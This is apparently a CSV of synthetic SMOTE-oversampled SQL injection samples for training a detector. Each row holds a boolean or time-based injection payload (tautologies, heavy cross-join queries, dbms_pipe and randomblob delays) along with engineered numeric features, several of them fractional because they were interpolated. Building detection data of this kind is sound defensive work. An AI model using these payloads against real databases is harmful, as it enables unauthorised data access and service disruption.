id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000228,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.4703835537059987,212.2756023909972,34.48680014064689,3.771118705437758,60.083067557430326,35.32453342709793,83.2453342709793,33.62266713548965,0.28243437995826504,0.16727333209233133,0.39215686274509803,0.1581354252043056,0.0,0.8377332864510353,2.0,0.0,0.0,2.0,0.0,17.811333567744825,0.0,1.1622667135489646,3.1622667135489646,10.649066854195858,0.0,0.8377332864510354,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.324533427097929,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.324533427097929
SMOTE_000229,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,2.14702814817461,161.72065664856373,34.90809849728456,4.2500431013327615,80.9117373405745,14.724295491853681,43.360328324281866,22.72429549185368,0.503628624437835,0.089727735929833,0.26726597928283785,0.13937766034949425,4.0,0.0,0.0,0.0,1.0,1.6360328324281865,0.0,5.272065664856373,0.0,3.180164162140933,3.636032832428187,5.180164162140933,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6360328324281865,1.6360328324281868,0.0,0.6360328324281866,1.0,1.0,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.636032832428187
SMOTE_000230,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.2926041283460123,351.25066291017004,40.82245468823066,3.790232071200324,117.00261524259489,34.73368203234598,146.82506993082552,52.68929570440365,0.33262377758284306,0.09912027437456815,0.41778773658407287,0.15046821145851594,4.0,0.0,0.0,0.0,0.0,1.0443863279423362,0.0,31.55613672057664,0.08877265588467242,2.0,4.0,11.044386327942336,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.9556136720576638,0.0,0.0,0.9556136720576638,1.0,0.04438632794233621,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.955613672057664,0.955613672057664,11.866841016172991
SMOTE_000231,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,0.49106432603204253,146.83522748917449,29.902935624097875,3.924041135486752,71.60274684342558,8.776515007217013,45.679450631314886,20.77651500721701,0.48611707428154316,0.060226669373744116,0.31165408666642247,0.14200216967829035,0.0,4.0,0.0,0.0,0.9029356240978736,2.0,0.0,6.388257503608505,2.0,0.1941287518042526,1.9029356240978736,3.4853218795106313,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.09706437590212638,0.9029356240978736,0.0,0.0,0.9029356240978736,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8058712481957473
SMOTE_000232,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.8808379150893361,357.4593317024294,41.18241646280367,3.7767955339336154,118.27033414878532,35.0,150.64174816523305,53.54724938841102,0.3309249481755346,0.09792044843819432,0.42137163479411804,0.1497829685921531,3.270334148785311,0.7296658512146893,0.0,0.0,0.0,1.1824164628036722,0.0,32.364832925607345,0.0,2.0,4.0,11.182416462803673,0.8175835371963276,0.18241646280367227,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000233,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.8477452401778037,207.78916563692144,35.672735395317545,3.8101056832145086,63.018206185952636,29.876376632508073,82.48730034407966,32.407282474381056,0.3030337320594526,0.1434574074913869,0.3972713862404744,0.15623747420868608,1.7345470790635094,0.0,0.0,0.0,0.0,1.7345470790635094,0.0,17.46909415812702,0.0,1.0,3.0,9.203641237190528,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.7345470790635094,0.0,0.7345470790635094,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.469094158127018
SMOTE_000234,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.0085993885095403,150.54975149089353,32.848169909088135,4.109052828409281,72.69633981817626,14.15707185454101,47.15707185454101,16.539267963635254,0.4837354460888095,0.09272030105706029,0.31342134291755075,0.1101229099365795,0.7696339818176263,0.0,2.0,0.0,1.0,1.7696339818176263,0.0,6.0,0.0,0.0,2.0,4.769633981817626,0.7696339818176263,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.7696339818176263,1.0,0.23036601818237373,0.7696339818176263,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.769633981817626
SMOTE_000235,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.8758819754721219,137.87183970718468,30.971519934929926,4.007817615343656,67.95727990239489,8.49287998373248,43.95727990239489,17.46439991866241,0.4935832688098897,0.06162562886906148,0.31876515738091915,0.12602594494012975,0.4928799837324813,0.0,2.0,0.0,1.0,0.9999999999999999,0.0,6.4928799837324815,0.49287998373248143,0.0,2.4928799837324815,4.0,0.49287998373248143,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.5071200162675186,0.49287998373248143,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000236,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.145073124005741,156.49385491965137,32.33743005356576,4.088685379731944,73.58435751339144,18.0,44.49385491965137,20.41564248660856,0.4704320532876656,0.11506130728272221,0.28406297690750615,0.13044366252210596,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.415642486608561,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.5843575133914395,0.4156424866085605,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000237,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.675568216880435,63.09791296933412,24.159443458489097,3.7693732397125306,14.539860864622277,19.159443458489097,21.239165187733647,8.159443458489093,0.23281079635936297,0.3041830830488884,0.3356861433447627,0.12731997724698588,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.0797217292445485,0.0,0.5398608646222741,0.5398608646222742,4.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.9248792163556234,129.0,29.0,4.025598880274295,70.11946960428705,6.922216925413252,37.22775923894638,14.730554231353311,0.5435617798781942,0.053660596321032955,0.288587280922065,0.11419034287870786,0.0,0.8083373059400614,1.4611084627066258,0.0,1.0,0.7305542313533129,0.0,5.191662694059939,0.0,0.0,2.269445768646687,3.1916626940599384,0.0,0.2694457686466872,0.7305542313533129,0.0,3.469446951953614e-18,0.7305542313533129,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000239,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.1857042743770598,141.0741993483658,29.79012725298078,3.9696975380570576,72.69139978278861,8.0,42.06178154173095,18.321018023846257,0.5172010703128835,0.057309424513106555,0.29681578716214563,0.12867371801186428,0.0,3.3703817589423455,0.0,0.0,1.0,1.790127252980782,0.0,5.580254505961563,1.5802545059615638,0.0,2.0,2.7901272529807817,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.5802545059615638,0.20987274701921804,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.790127252980782
SMOTE_000240,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,2.1130210591938026,126.35005284761286,35.96364917517887,3.8727289553994657,38.93638605656303,18.963649175178876,49.46819302828152,18.981824587589436,0.3061538954290096,0.14849018541357173,0.39462166574194374,0.15073425341547486,3.9909122937947186,0.0,2.0,1.0,0.0,1.4954561468973593,0.0,9.0,0.0,0.0,1.0,4.990912293794718,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.4954561468973593,0.0,0.4954561468973593,0.0,0.5045438531026407,0.4954561468973593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9909122937947186
SMOTE_000241,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.6383460848404732,150.72637604764975,30.38928075921224,3.7905962226470518,44.167842277636716,18.222849214739583,58.66854764421875,29.667136911054687,0.29325285978262544,0.1202414206521237,0.38784434038032845,0.19866137918492238,1.111424607369792,2.888575392630208,0.0,0.0,0.0,2.0,0.0,11.667136911054687,2.0,1.722143848157552,1.5557123036848959,8.0,0.27785615184244794,0.7221438481575521,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.7221438481575522,0.27785615184244794,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.3892807592122398,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3892807592122396
SMOTE_000242,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.3061408182142519,160.0,35.600584623703256,4.236486727842463,77.66715385308605,18.0,41.46598460567954,22.866861541234417,0.48541971158178776,0.1125,0.25916240378549704,0.1429178846327151,2.800292311851627,0.06656922938279097,2.0,0.0,1.0,2.0,0.0,5.066569229382791,0.0,5.0,4.0,5.933430770617209,0.9334307706172089,0.06656922938279097,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.9334307706172091,0.0,1.0,1.0,0.933430770617209,0.06656922938279097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.933430770617209
SMOTE_000243,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.20508920221730942,388.9565234102805,31.0,3.3047006455510926,94.10434765897196,58.0,183.9565234102805,52.895652341028054,0.2419874039253825,0.14913736411783599,0.4728765578593728,0.13599867409740868,0.0,0.0,1.1043476589719508,0.0,0.0,3.0,0.0,37.791304682056094,0.0,0.0,1.0,14.10434765897195,0.0,0.0,0.052173829485975376,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.052173829485975376,0.0,0.9478261705140245,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000244,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.0031373692554531513,273.9541978053908,37.99770989026954,3.8048420025512057,82.98740439648246,34.99083956107815,111.97938901242584,43.99656483540431,0.30292517291766113,0.12772308186017123,0.4087510517686836,0.1606006934534841,0.0,0.0,2.0,0.0,0.0,1.998854945134769,0.0,23.997709890269537,0.0,2.0,4.0,13.99885494513477,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.998854945134769,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.998854945134768
SMOTE_000245,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.07814755922657059,254.5647140168782,36.97927209604182,3.8084993019807367,75.91708838416727,36.7927209604182,99.87563257625092,41.97927209604182,0.29823930405027504,0.14448214222024713,0.3923548668553069,0.16492368687417092,0.0,0.0,2.0,0.0,0.0,1.9792720960418198,0.0,22.0,0.0,2.0,4.0,13.97927209604182,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.9792720960418198,0.0,0.02072790395818014,0.9792720960418198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.97927209604182
SMOTE_000246,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.1542645667951646,116.2024847069766,29.09619877655813,4.0927000286561785,64.76959021246503,7.8076024468837435,31.38479510623251,12.24049694139532,0.5572387486451538,0.06759344122582718,0.26999841063978036,0.10516939948923867,0.0,1.0961987765581283,0.0,0.0,1.0,0.9999999999999999,0.0,4.048099388279065,0.0,0.0,2.048099388279064,2.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.04809938827906424,0.9519006117209359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000247,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,0.12468875434293783,137.57682646071203,37.837240946427706,3.954533589684828,43.03255181071446,22.739585514284325,53.837240946427706,17.96744818928554,0.3129094847575639,0.16514758216665856,0.3913269925639753,0.1306159405118022,3.0,0.0,2.0,1.0,0.0,1.9674481892855409,0.0,9.0,0.0,0.0,1.0,4.967448189285541,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.9674481892855409,0.0,0.9674481892855407,0.03255181071445923,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.967448189285541
SMOTE_000248,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.8603907821349575,137.79857529825205,30.955238955167122,4.007218916484471,67.93285843275069,8.488809738791781,43.93285843275068,17.444048693958905,0.49366826680580367,0.06162884849011882,0.3187574302903815,0.12594545441369603,0.4888097387917807,0.0,2.0,0.0,1.0,0.9999999999999999,0.0,6.4888097387917805,0.4888097387917809,0.0,2.488809738791781,4.0,0.48880973879178075,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.5111902612082192,0.48880973879178086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000249,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.398933082257144,61.754277827668275,21.782854185375605,3.6391015125806927,10.719997699736581,22.12571297127805,20.251425942556097,8.65714121409756,0.16885656765261797,0.36596991306660853,0.3277191573784054,0.1374543619023681,0.0,0.5314282428195118,3.0,0.0,0.0,2.0,0.0,2.062856485639024,0.0,0.5314282428195118,0.5314282428195121,5.0,0.0,0.5314282428195117,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.0747254208951271,212.3841680359355,36.26298400347763,3.8315077788679015,64.05193601391052,30.034624009273678,84.29760801275131,34.0,0.3012190155039114,0.1409168808294919,0.3970911770966546,0.1607729265699421,2.4913439976815805,0.0,0.0,0.0,0.0,2.0,0.0,17.50865600231842,0.49134399768158066,1.0,3.0,9.50865600231842,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.7543280011592097,0.0,0.7543280011592097,0.0,0.24567199884079044,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.75432800115921
SMOTE_000251,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.42227344911722425,273.3730148283497,38.0,3.804450695841411,82.87460296566995,35.2507940686601,111.2476177940197,44.0,0.3031595932738249,0.12896727614876166,0.406914899937403,0.16095823064001047,0.12539703433005123,0.0,2.0,0.0,0.0,2.0,0.0,23.874602965669947,0.0,2.0,4.0,14.0,0.12539703433005112,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.8746029656699489,0.12539703433005112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000252,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,2.1738683315368474,229.18816794726533,34.51085584311146,3.741215799454176,69.09408397363266,28.007237228740976,92.0578978299278,40.0289489149639,0.29888074261760983,0.1232954433083793,0.4028966898851551,0.17492712418885578,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.014474457481946,0.9927627712590261,1.5036186143704868,3.5036186143704873,10.014474457481947,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.4963813856295132,0.5036186143704869,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.007237228740974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.007237228740975
